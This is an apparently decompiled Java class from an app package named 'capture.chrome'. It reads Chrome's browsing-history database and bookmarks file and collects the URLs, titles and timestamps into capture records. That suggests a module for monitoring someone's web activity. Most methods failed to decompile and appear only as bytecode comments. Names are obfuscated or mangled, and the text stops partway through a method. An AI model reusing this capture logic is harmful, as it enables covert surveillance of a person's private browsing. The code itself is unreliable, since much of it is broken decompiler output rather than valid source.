package com.vvt.capture.chrome.a;

import com.vvt.capture.chrome.ChromeUrlData;
import com.vvt.capture.chrome.ChromeUrlData.UrlType;
import com.vvt.e.c;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class a
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      return;
    }
  }
  
  /* Error */
  public static long a(int paramInt, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_3
    //   3: aconst_null
    //   4: astore 5
    //   6: aload_1
    //   7: aload_2
    //   8: invokestatic 27	com/vvt/capture/chrome/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   11: astore 5
    //   13: ldc 29
    //   15: astore 6
    //   17: ldc 31
    //   19: astore 7
    //   21: aconst_null
    //   22: astore 8
    //   24: aconst_null
    //   25: astore 9
    //   27: iconst_0
    //   28: istore 10
    //   30: iload_0
    //   31: invokestatic 37	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   34: astore 11
    //   36: aload 5
    //   38: aload 7
    //   40: aconst_null
    //   41: aconst_null
    //   42: aconst_null
    //   43: aconst_null
    //   44: aconst_null
    //   45: aload 6
    //   47: aload 11
    //   49: invokevirtual 43	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   52: astore 9
    //   54: aload 9
    //   56: ifnull +106 -> 162
    //   59: aload 9
    //   61: invokeinterface 49 1 0
    //   66: istore 12
    //   68: iload 12
    //   70: ifeq +70 -> 140
    //   73: ldc 51
    //   75: astore 7
    //   77: aload 9
    //   79: aload 7
    //   81: invokeinterface 55 2 0
    //   86: istore 12
    //   88: aload 9
    //   90: iload 12
    //   92: invokeinterface 59 2 0
    //   97: lstore_3
    //   98: lload_3
    //   99: lstore 13
    //   101: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   104: istore 10
    //   106: iload 10
    //   108: ifeq +3 -> 111
    //   111: aload 9
    //   113: ifnull +10 -> 123
    //   116: aload 9
    //   118: invokeinterface 63 1 0
    //   123: aload 5
    //   125: ifnull +8 -> 133
    //   128: aload 5
    //   130: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   133: lload 13
    //   135: lstore 15
    //   137: lload 15
    //   139: lreturn
    //   140: aload 9
    //   142: invokeinterface 68 1 0
    //   147: istore 12
    //   149: iload 12
    //   151: ifne +21 -> 172
    //   154: lconst_0
    //   155: lstore_3
    //   156: lload_3
    //   157: lstore 13
    //   159: goto -58 -> 101
    //   162: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   165: istore 12
    //   167: iload 12
    //   169: ifeq +3 -> 172
    //   172: lload_3
    //   173: lstore 13
    //   175: goto -74 -> 101
    //   178: astore 7
    //   180: aconst_null
    //   181: astore 8
    //   183: aconst_null
    //   184: astore 9
    //   186: lload_3
    //   187: lstore 15
    //   189: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   192: istore 10
    //   194: iload 10
    //   196: ifeq +3 -> 199
    //   199: aload 8
    //   201: ifnull +10 -> 211
    //   204: aload 8
    //   206: invokeinterface 63 1 0
    //   211: aload 9
    //   213: ifnull -76 -> 137
    //   216: aload 9
    //   218: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   221: goto -84 -> 137
    //   224: astore 7
    //   226: aconst_null
    //   227: astore 9
    //   229: aload 7
    //   231: astore 17
    //   233: iconst_0
    //   234: istore 12
    //   236: aconst_null
    //   237: astore 7
    //   239: aload 17
    //   241: astore 5
    //   243: aload 9
    //   245: ifnull +10 -> 255
    //   248: aload 9
    //   250: invokeinterface 63 1 0
    //   255: aload 7
    //   257: ifnull +8 -> 265
    //   260: aload 7
    //   262: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   265: aload 5
    //   267: athrow
    //   268: astore 7
    //   270: aconst_null
    //   271: astore 9
    //   273: aload 7
    //   275: astore 17
    //   277: aload 5
    //   279: astore 7
    //   281: aload 17
    //   283: astore 5
    //   285: goto -42 -> 243
    //   288: astore 17
    //   290: aload 5
    //   292: astore 7
    //   294: aload 17
    //   296: astore 5
    //   298: goto -55 -> 243
    //   301: astore 5
    //   303: aload 9
    //   305: astore 7
    //   307: aload 8
    //   309: astore 9
    //   311: goto -68 -> 243
    //   314: astore 7
    //   316: aconst_null
    //   317: astore 8
    //   319: aload 5
    //   321: astore 9
    //   323: lload_3
    //   324: lstore 15
    //   326: goto -137 -> 189
    //   329: astore 7
    //   331: aload 9
    //   333: astore 8
    //   335: aload 5
    //   337: astore 9
    //   339: lload_3
    //   340: lstore 15
    //   342: goto -153 -> 189
    //   345: pop
    //   346: aload 9
    //   348: astore 17
    //   350: aload 5
    //   352: astore 9
    //   354: lload 13
    //   356: lstore 15
    //   358: aload 17
    //   360: astore 8
    //   362: goto -173 -> 189
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	365	0	paramInt	int
    //   0	365	1	paramString1	String
    //   0	365	2	paramString2	String
    //   2	338	3	l1	long
    //   4	293	5	localObject1	Object
    //   301	50	5	localObject2	Object
    //   15	31	6	str1	String
    //   19	61	7	str2	String
    //   178	1	7	localException1	Exception
    //   224	6	7	localObject3	Object
    //   237	24	7	localObject4	Object
    //   268	6	7	localObject5	Object
    //   279	27	7	localObject6	Object
    //   314	1	7	localException2	Exception
    //   329	1	7	localException3	Exception
    //   22	339	8	localObject7	Object
    //   25	328	9	localObject8	Object
    //   28	167	10	bool1	boolean
    //   34	14	11	str3	String
    //   66	3	12	bool2	boolean
    //   86	64	12	i	int
    //   165	70	12	bool3	boolean
    //   99	256	13	l2	long
    //   135	222	15	l3	long
    //   231	51	17	localObject9	Object
    //   288	7	17	localObject10	Object
    //   348	11	17	localObject11	Object
    //   345	1	27	localException4	Exception
    // Exception table:
    //   from	to	target	type
    //   7	11	178	java/lang/Exception
    //   7	11	224	finally
    //   30	34	268	finally
    //   47	52	268	finally
    //   59	66	288	finally
    //   79	86	288	finally
    //   90	97	288	finally
    //   101	104	288	finally
    //   140	147	288	finally
    //   162	165	288	finally
    //   189	192	301	finally
    //   30	34	314	java/lang/Exception
    //   47	52	314	java/lang/Exception
    //   59	66	329	java/lang/Exception
    //   79	86	329	java/lang/Exception
    //   90	97	329	java/lang/Exception
    //   140	147	329	java/lang/Exception
    //   162	165	329	java/lang/Exception
    //   101	104	345	java/lang/Exception
  }
  
  /* Error */
  public static long a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: iconst_m1
    //   11: i2l
    //   12: lstore 4
    //   14: aload_0
    //   15: aload_1
    //   16: invokestatic 27	com/vvt/capture/chrome/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   19: astore 6
    //   21: ldc 29
    //   23: astore 7
    //   25: ldc 31
    //   27: astore 8
    //   29: iconst_0
    //   30: istore 9
    //   32: aconst_null
    //   33: astore 10
    //   35: iconst_0
    //   36: istore 11
    //   38: aconst_null
    //   39: astore 12
    //   41: iconst_0
    //   42: istore 13
    //   44: ldc 72
    //   46: astore 14
    //   48: aload 6
    //   50: aload 8
    //   52: aconst_null
    //   53: aconst_null
    //   54: aconst_null
    //   55: aconst_null
    //   56: aconst_null
    //   57: aload 7
    //   59: aload 14
    //   61: invokevirtual 43	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   64: astore 12
    //   66: aload 12
    //   68: ifnull +294 -> 362
    //   71: aload 12
    //   73: invokeinterface 75 1 0
    //   78: istore 15
    //   80: iload 15
    //   82: ifeq +92 -> 174
    //   85: ldc 51
    //   87: astore 8
    //   89: aload 12
    //   91: aload 8
    //   93: invokeinterface 55 2 0
    //   98: istore 15
    //   100: aload 12
    //   102: iload 15
    //   104: invokeinterface 59 2 0
    //   109: lstore 4
    //   111: lload 4
    //   113: lstore 16
    //   115: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   118: istore 13
    //   120: iload 13
    //   122: ifeq +3 -> 125
    //   125: aload 12
    //   127: ifnull +10 -> 137
    //   130: aload 12
    //   132: invokeinterface 63 1 0
    //   137: aload 6
    //   139: ifnull +8 -> 147
    //   142: aload 6
    //   144: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   147: lload 16
    //   149: lstore 18
    //   151: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   154: istore 9
    //   156: iload 9
    //   158: ifeq +3 -> 161
    //   161: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   164: istore 9
    //   166: iload 9
    //   168: ifeq +3 -> 171
    //   171: lload 18
    //   173: lreturn
    //   174: aload 12
    //   176: invokeinterface 68 1 0
    //   181: istore 15
    //   183: iload 15
    //   185: ifne +177 -> 362
    //   188: lconst_0
    //   189: lstore 4
    //   191: lload 4
    //   193: lstore 16
    //   195: goto -80 -> 115
    //   198: astore 6
    //   200: iconst_0
    //   201: istore 9
    //   203: aconst_null
    //   204: astore 10
    //   206: lload 4
    //   208: lstore 18
    //   210: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   213: istore 11
    //   215: iload 11
    //   217: ifeq +3 -> 220
    //   220: aload 10
    //   222: ifnull +10 -> 232
    //   225: aload 10
    //   227: invokeinterface 63 1 0
    //   232: aload_2
    //   233: ifnull -82 -> 151
    //   236: aload_2
    //   237: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   240: goto -89 -> 151
    //   243: astore 6
    //   245: iconst_0
    //   246: istore 11
    //   248: aconst_null
    //   249: astore 12
    //   251: aload 12
    //   253: ifnull +10 -> 263
    //   256: aload 12
    //   258: invokeinterface 63 1 0
    //   263: aload_2
    //   264: ifnull +7 -> 271
    //   267: aload_2
    //   268: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   271: aload 6
    //   273: athrow
    //   274: astore 8
    //   276: iconst_0
    //   277: istore 11
    //   279: aconst_null
    //   280: astore 12
    //   282: aload 6
    //   284: astore_2
    //   285: aload 8
    //   287: astore 6
    //   289: goto -38 -> 251
    //   292: astore 8
    //   294: aload 6
    //   296: astore_2
    //   297: aload 8
    //   299: astore 6
    //   301: goto -50 -> 251
    //   304: astore 6
    //   306: aload 10
    //   308: astore 12
    //   310: goto -59 -> 251
    //   313: astore 8
    //   315: iconst_0
    //   316: istore 9
    //   318: aconst_null
    //   319: astore 10
    //   321: aload 6
    //   323: astore_2
    //   324: lload 4
    //   326: lstore 18
    //   328: goto -118 -> 210
    //   331: astore 8
    //   333: aload 12
    //   335: astore 10
    //   337: aload 6
    //   339: astore_2
    //   340: lload 4
    //   342: lstore 18
    //   344: goto -134 -> 210
    //   347: pop
    //   348: aload 6
    //   350: astore_2
    //   351: lload 16
    //   353: lstore 18
    //   355: aload 12
    //   357: astore 10
    //   359: goto -149 -> 210
    //   362: lload 4
    //   364: lstore 16
    //   366: goto -251 -> 115
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	369	0	paramString1	String
    //   0	369	1	paramString2	String
    //   1	350	2	localObject1	Object
    //   5	2	3	bool1	boolean
    //   12	351	4	l1	long
    //   19	124	6	localSQLiteDatabase	android.database.sqlite.SQLiteDatabase
    //   198	1	6	localException1	Exception
    //   243	40	6	localObject2	Object
    //   287	13	6	localObject3	Object
    //   304	45	6	localObject4	Object
    //   23	35	7	str1	String
    //   27	65	8	str2	String
    //   274	12	8	localObject5	Object
    //   292	6	8	localObject6	Object
    //   313	1	8	localException2	Exception
    //   331	1	8	localException3	Exception
    //   30	287	9	bool2	boolean
    //   33	325	10	localObject7	Object
    //   36	242	11	bool3	boolean
    //   39	317	12	localObject8	Object
    //   42	79	13	bool4	boolean
    //   46	14	14	str3	String
    //   78	3	15	bool5	boolean
    //   98	86	15	i	int
    //   113	252	16	l2	long
    //   149	205	18	l3	long
    //   347	1	26	localException4	Exception
    // Exception table:
    //   from	to	target	type
    //   15	19	198	java/lang/Exception
    //   15	19	243	finally
    //   59	64	274	finally
    //   71	78	292	finally
    //   91	98	292	finally
    //   102	109	292	finally
    //   115	118	292	finally
    //   174	181	292	finally
    //   210	213	304	finally
    //   59	64	313	java/lang/Exception
    //   71	78	331	java/lang/Exception
    //   91	98	331	java/lang/Exception
    //   102	109	331	java/lang/Exception
    //   174	181	331	java/lang/Exception
    //   115	118	347	java/lang/Exception
  }
  
  public static ArrayList a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = c(paramString);
    boolean bool2 = b;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  /* Error */
  public static ArrayList a(String paramString1, long paramLong1, long paramLong2, String paramString2)
  {
    // Byte code:
    //   0: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   3: istore 6
    //   5: iload 6
    //   7: ifeq +3 -> 10
    //   10: new 80	java/util/ArrayList
    //   13: astore 7
    //   15: aload 7
    //   17: invokespecial 83	java/util/ArrayList:<init>	()V
    //   20: aconst_null
    //   21: astore 8
    //   23: iconst_0
    //   24: istore 6
    //   26: aconst_null
    //   27: astore 9
    //   29: ldc 85
    //   31: astore 10
    //   33: aload_0
    //   34: aload 5
    //   36: invokestatic 27	com/vvt/capture/chrome/a/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   39: astore 8
    //   41: ldc 31
    //   43: astore 10
    //   45: aload 8
    //   47: ifnull +507 -> 554
    //   50: ldc 87
    //   52: astore 11
    //   54: iconst_4
    //   55: istore 12
    //   57: iload 12
    //   59: anewarray 4	java/lang/Object
    //   62: astore 13
    //   64: iconst_0
    //   65: istore 14
    //   67: aconst_null
    //   68: astore 15
    //   70: aload 13
    //   72: iconst_0
    //   73: aload 10
    //   75: aastore
    //   76: iconst_1
    //   77: istore 16
    //   79: ldc 51
    //   81: astore 15
    //   83: aload 13
    //   85: iload 16
    //   87: aload 15
    //   89: aastore
    //   90: iconst_2
    //   91: istore 16
    //   93: lload_1
    //   94: invokestatic 95	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   97: astore 15
    //   99: aload 13
    //   101: iload 16
    //   103: aload 15
    //   105: aastore
    //   106: iconst_3
    //   107: istore 16
    //   109: ldc 51
    //   111: astore 15
    //   113: aload 13
    //   115: iload 16
    //   117: aload 15
    //   119: aastore
    //   120: aload 11
    //   122: aload 13
    //   124: invokestatic 102	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   127: astore 10
    //   129: iconst_0
    //   130: istore 17
    //   132: aconst_null
    //   133: astore 11
    //   135: aload 8
    //   137: aload 10
    //   139: aconst_null
    //   140: invokevirtual 106	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   143: astore 9
    //   145: aload 9
    //   147: ifnull +407 -> 554
    //   150: aload 9
    //   152: invokeinterface 75 1 0
    //   157: istore 16
    //   159: iload 16
    //   161: ifeq +393 -> 554
    //   164: ldc 108
    //   166: astore 10
    //   168: aload 9
    //   170: aload 10
    //   172: invokeinterface 55 2 0
    //   177: istore 16
    //   179: aload 9
    //   181: iload 16
    //   183: invokeinterface 111 2 0
    //   188: astore 10
    //   190: aload 10
    //   192: ifnull -42 -> 150
    //   195: aload 10
    //   197: invokevirtual 115	java/lang/String:trim	()Ljava/lang/String;
    //   200: astore 11
    //   202: aload 11
    //   204: invokevirtual 118	java/lang/String:length	()I
    //   207: istore 17
    //   209: iload 17
    //   211: ifeq -61 -> 150
    //   214: ldc 120
    //   216: astore 11
    //   218: aload 10
    //   220: aload 11
    //   222: invokevirtual 124	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   225: istore 17
    //   227: iload 17
    //   229: ifne -79 -> 150
    //   232: ldc 51
    //   234: astore 11
    //   236: aload 9
    //   238: aload 11
    //   240: invokeinterface 55 2 0
    //   245: istore 17
    //   247: aload 9
    //   249: iload 17
    //   251: invokeinterface 59 2 0
    //   256: lstore 18
    //   258: ldc 126
    //   260: astore 15
    //   262: aload 9
    //   264: aload 15
    //   266: invokeinterface 55 2 0
    //   271: istore 14
    //   273: aload 9
    //   275: iload 14
    //   277: invokeinterface 59 2 0
    //   282: lstore 20
    //   284: ldc -128
    //   286: astore 22
    //   288: aload 9
    //   290: aload 22
    //   292: invokeinterface 55 2 0
    //   297: istore 23
    //   299: aload 9
    //   301: iload 23
    //   303: invokeinterface 111 2 0
    //   308: astore 22
    //   310: invokestatic 133	com/vvt/e/MyUncaughtExceptionHandler:a	()Lcom/vvt/e/MyUncaughtExceptionHandler;
    //   313: astore 24
    //   315: new 135	java/text/SimpleDateFormat
    //   318: astore 25
    //   320: ldc -119
    //   322: astore 26
    //   324: aload 25
    //   326: aload 26
    //   328: invokespecial 140	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   331: aload 24
    //   333: invokevirtual 142	com/vvt/e/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   336: astore 24
    //   338: aload 24
    //   340: invokestatic 148	java/util/TimeZone:getTimeZone	(Ljava/lang/String;)Ljava/util/TimeZone;
    //   343: astore 24
    //   345: aload 25
    //   347: aload 24
    //   349: invokevirtual 152	java/text/SimpleDateFormat:setTimeZone	(Ljava/util/TimeZone;)V
    //   352: invokestatic 158	java/lang/System:currentTimeMillis	()J
    //   355: lstore 27
    //   357: new 160	java/sql/Date
    //   360: astore 24
    //   362: aload 24
    //   364: lload 27
    //   366: invokespecial 163	java/sql/Date:<init>	(J)V
    //   369: aload 25
    //   371: aload 24
    //   373: invokevirtual 166	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   376: astore 24
    //   378: new 168	com/vvt/capture/chrome/ChromeUrlData
    //   381: astore 25
    //   383: aload 25
    //   385: invokespecial 169	com/vvt/capture/chrome/ChromeUrlData:<init>	()V
    //   388: aload 25
    //   390: lload 20
    //   392: invokevirtual 171	com/vvt/capture/chrome/ChromeUrlData:a	(J)V
    //   395: getstatic 177	com/vvt/capture/chrome/ChromeUrlData$UrlType:HISTORY	Lcom/vvt/capture/chrome/ChromeUrlData$UrlType;
    //   398: astore 15
    //   400: aload 25
    //   402: aload 15
    //   404: invokevirtual 180	com/vvt/capture/chrome/ChromeUrlData:a	(Lcom/vvt/capture/chrome/ChromeUrlData$UrlType;)V
    //   407: aload 25
    //   409: aload 22
    //   411: invokevirtual 182	com/vvt/capture/chrome/ChromeUrlData:a	(Ljava/lang/String;)V
    //   414: aload 25
    //   416: aload 10
    //   418: invokevirtual 184	com/vvt/capture/chrome/ChromeUrlData:removeFromPath	(Ljava/lang/String;)V
    //   421: aload 25
    //   423: lload 27
    //   425: invokevirtual 186	com/vvt/capture/chrome/ChromeUrlData:removeFromPath	(J)V
    //   428: aload 25
    //   430: aload 24
    //   432: invokevirtual 188	com/vvt/capture/chrome/ChromeUrlData:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   435: aload 25
    //   437: lload 27
    //   439: invokevirtual 190	com/vvt/capture/chrome/ChromeUrlData:MyUncaughtExceptionHandler	(J)V
    //   442: aload 25
    //   444: lload 18
    //   446: invokevirtual 193	com/vvt/capture/chrome/ChromeUrlData:d	(J)V
    //   449: aload 7
    //   451: aload 25
    //   453: invokevirtual 197	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   456: pop
    //   457: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   460: istore 16
    //   462: iload 16
    //   464: ifeq -314 -> 150
    //   467: goto -317 -> 150
    //   470: astore 10
    //   472: getstatic 22	com/vvt/capture/chrome/a/a:MyUncaughtExceptionHandler	Z
    //   475: istore 16
    //   477: iload 16
    //   479: ifeq +3 -> 482
    //   482: aload 9
    //   484: ifnull +10 -> 494
    //   487: aload 9
    //   489: invokeinterface 63 1 0
    //   494: aload 8
    //   496: ifnull +8 -> 504
    //   499: aload 8
    //   501: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   504: getstatic 14	com/vvt/capture/chrome/a/a:a	Z
    //   507: istore 6
    //   509: iload 6
    //   511: ifeq +3 -> 514
    //   514: aload 7
    //   516: areturn
    //   517: astore 29
    //   519: aconst_null
    //   520: astore 7
    //   522: aconst_null
    //   523: astore 8
    //   525: aload 29
    //   527: astore 9
    //   529: aload 8
    //   531: ifnull +10 -> 541
    //   534: aload 8
    //   536: invokeinterface 63 1 0
    //   541: aload 7
    //   543: ifnull +8 -> 551
    //   546: aload 7
    //   548: invokevirtual 64	android/database/sqlite/SQLiteDatabase:close	()V
    //   551: aload 9
    //   553: athrow
    //   554: aload 9
    //   556: ifnull +10 -> 566
    //   559: aload 9
    //   561: invokeinterface 63 1 0
    //   566: aload 8
    //   568: ifnull -64 -> 504
    //   571: goto -72 -> 499
    //   574: astore 29
    //   576: aload 8
    //   578: astore 7
    //   580: aconst_null
    //   581: astore 8
    //   583: aload 29
    //   585: astore 9
    //   587: goto -58 -> 529
    //   590: astore 29
    //   592: aload 8
    //   594: astore 7
    //   596: aload 9
    //   598: astore 8
    //   600: aload 29
    //   602: astore 9
    //   604: goto -75 -> 529
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	607	0	paramString1	String
    //   0	607	1	paramLong1	long
    //   0	607	3	paramLong2	long
    //   0	607	5	paramString2	String
    //   3	507	6	bool1	boolean
    //   13	582	7	localObject1	Object
    //   21	578	8	localObject2	Object
    //   27	576	9	localObject3	Object
    //   31	386	10	str1	String
    //   470	1	10	localException	Exception
    //   52	187	11	str2	String
    //   55	3	12	i	int
    //   62	61	13	arrayOfObject	Object[]
    //   65	211	14	j	int
    //   68	335	15	localObject4	Object
    //   77	39	16	k	int
    //   157	3	16	bool2	boolean
    //   177	5	16	m	int
    //   460	18	16	bool3	boolean
    //   130	80	17	n	int
    //   225	3	17	bool4	boolean
    //   245	5	17	i1	int
    //   256	189	18	l1	long
    //   282	109	20	l2	long
    //   286	124	22	str3	String
    //   297	5	23	i2	int
    //   313	118	24	localObject5	Object
    //   318	134	25	localObject6	Object
    //   322	5	26	str4	String
    //   355	83	27	l3	long
    //   517	9	29	localObject7	Object
    //   574	10	29	localObject8	Object
    //   590	11	29	localObject9	Object
    // Exception table:
    //   from	to	target	type
    //   34	39	470	java/lang/Exception
    //   57	62	470	java/lang/Exception
    //   73	76	470	java/lang/Exception
    //   87	90	470	java/lang/Exception
    //   93	97	470	java/lang/Exception
    //   103	106	470	java/lang/Exception
    //   117	120	470	java/lang/Exception
    //   122	127	470	java/lang/Exception
    //   139	143	470	java/lang/Exception
    //   150	157	470	java/lang/Exception
    //   170	177	470	java/lang/Exception
    //   181	188	470	java/lang/Exception
    //   195	200	470	java/lang/Exception
    //   202	207	470	java/lang/Exception
    //   220	225	470	java/lang/Exception
    //   238	245	470	java/lang/Exception
    //   249	256	470	java/lang/Exception
    //   264	271	470	java/lang/Exception
    //   275	282	470	java/lang/Exception
    //   290	297	470	java/lang/Exception
    //   301	308	470	java/lang/Exception
    //   310	313	470	java/lang/Exception
    //   315	318	470	java/lang/Exception
    //   326	331	470	java/lang/Exception
    //   331	336	470	java/lang/Exception
    //   338	343	470	java/lang/Exception
    //   347	352	470	java/lang/Exception
    //   352	355	470	java/lang/Exception
    //   357	360	470	java/lang/Exception
    //   364	369	470	java/lang/Exception
    //   371	376	470	java/lang/Exception
    //   378	381	470	java/lang/Exception
    //   383	388	470	java/lang/Exception
    //   390	395	470	java/lang/Exception
    //   395	398	470	java/lang/Exception
    //   402	407	470	java/lang/Exception
    //   409	414	470	java/lang/Exception
    //   416	421	470	java/lang/Exception
    //   423	428	470	java/lang/Exception
    //   430	435	470	java/lang/Exception
    //   437	442	470	java/lang/Exception
    //   444	449	470	java/lang/Exception
    //   451	457	470	java/lang/Exception
    //   457	460	470	java/lang/Exception
    //   34	39	517	finally
    //   57	62	574	finally
    //   73	76	574	finally
    //   87	90	574	finally
    //   93	97	574	finally
    //   103	106	574	finally
    //   117	120	574	finally
    //   122	127	574	finally
    //   139	143	574	finally
    //   150	157	590	finally
    //   170	177	590	finally
    //   181	188	590	finally
    //   195	200	590	finally
    //   202	207	590	finally
    //   220	225	590	finally
    //   238	245	590	finally
    //   249	256	590	finally
    //   264	271	590	finally
    //   275	282	590	finally
    //   290	297	590	finally
    //   301	308	590	finally
    //   310	313	590	finally
    //   315	318	590	finally
    //   326	331	590	finally
    //   331	336	590	finally
    //   338	343	590	finally
    //   347	352	590	finally
    //   352	355	590	finally
    //   357	360	590	finally
    //   364	369	590	finally
    //   371	376	590	finally
    //   378	381	590	finally
    //   383	388	590	finally
    //   390	395	590	finally
    //   395	398	590	finally
    //   402	407	590	finally
    //   409	414	590	finally
    //   416	421	590	finally
    //   423	428	590	finally
    //   430	435	590	finally
    //   437	442	590	finally
    //   444	449	590	finally
    //   451	457	590	finally
    //   457	460	590	finally
    //   472	475	590	finally
  }
  
  private static void a(JSONObject paramJSONObject, ArrayList paramArrayList)
  {
    int i = a;
    if (i != 0) {}
    Object localObject1 = "children";
    try
    {
      i = paramJSONObject.has((String)localObject1);
      Object localObject2;
      Object localObject3;
      if (i != 0)
      {
        i = a;
        if (i != 0) {}
        localObject1 = "children";
        localObject2 = paramJSONObject.getJSONArray((String)localObject1);
        i = 0;
        localObject1 = null;
        for (;;)
        {
          int k = ((JSONArray)localObject2).length();
          if (i >= k) {
            break;
          }
          localObject3 = ((JSONArray)localObject2).getJSONObject(i);
          a((JSONObject)localObject3, paramArrayList);
          int j;
          i += 1;
        }
      }
      localObject1 = "url";
      bool = paramJSONObject.has((String)localObject1);
      if (bool)
      {
        localObject1 = new com/vvt/capture/chrome/ChromeUrlData;
        ((ChromeUrlData)localObject1).<init>();
        localObject1 = "name";
        localObject1 = paramJSONObject.getString((String)localObject1);
        localObject2 = "url";
        localObject2 = paramJSONObject.getString((String)localObject2);
        localObject3 = "id";
        localObject3 = paramJSONObject.getString((String)localObject3);
        long l1 = Long.parseLong((String)localObject3);
        String str1 = "date_added";
        str1 = paramJSONObject.getString(str1);
        long l2 = Long.parseLong(str1);
        Object localObject4 = c.a();
        Object localObject5 = new java/text/SimpleDateFormat;
        String str2 = "dd/MM/yy HH:mm:ss";
        ((SimpleDateFormat)localObject5).<init>(str2);
        localObject4 = ((c)localObject4).c();
        localObject4 = TimeZone.getTimeZone((String)localObject4);
        ((SimpleDateFormat)localObject5).setTimeZone((TimeZone)localObject4);
        long l3 = System.currentTimeMillis();
        localObject4 = new java/sql/Date;
        ((java.sql.Date)localObject4).<init>(l3);
        localObject4 = ((SimpleDateFormat)localObject5).format((java.util.Date)localObject4);
        localObject5 = new com/vvt/capture/chrome/ChromeUrlData;
        ((ChromeUrlData)localObject5).<init>();
        ((ChromeUrlData)localObject5).a(l1);
        localObject3 = ChromeUrlData.UrlType.HISTORY;
        ((ChromeUrlData)localObject5).a((ChromeUrlData.UrlType)localObject3);
        ((ChromeUrlData)localObject5).a((String)localObject1);
        ((ChromeUrlData)localObject5).b((String)localObject2);
        ((ChromeUrlData)localObject5).b(l3);
        ((ChromeUrlData)localObject5).c((String)localObject4);
        ((ChromeUrlData)localObject5).c(l3);
        ((ChromeUrlData)localObject5).d(l2);
        paramArrayList.add(localObject5);
        bool = a;
        if (!bool) {}
      }
    }
    catch (JSONException localJSONException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
  
  /* Error */
  private static String b(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: new 233	java/lang/StringBuilder
    //   5: astore_2
    //   6: aload_2
    //   7: invokespecial 234	java/lang/StringBuilder:<init>	()V
    //   10: new 236	java/io/File
    //   13: astore_3
    //   14: aload_3
    //   15: aload_0
    //   16: invokespecial 237	java/io/File:<init>	(Ljava/lang/String;)V
    //   19: aload_3
    //   20: invokevirtual 240	java/io/File:exists	()Z
    //   23: istore 4
    //   25: iload 4
    //   27: ifeq +203 -> 230
    //   30: new 242	java/io/FileReader
    //   33: astore 5
    //   35: aload 5
    //   37: aload_3
    //   38: invokespecial 245	java/io/FileReader:<init>	(Ljava/io/File;)V
    //   41: new 247	java/io/BufferedReader
    //   44: astore_3
    //   45: aload_3
    //   46: aload 5
    //   48: invokespecial 250	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   51: aload_3
    //   52: invokevirtual 253	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   55: astore_1
    //   56: aload_1
    //   57: ifnull +184 -> 241
    //   60: aload_2
    //   61: aload_1
    //   62: invokevirtual 257	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   65: pop
    //   66: goto -15 -> 51
    //   69: astore_1
    //   70: aload_3
    //   71: astore_1
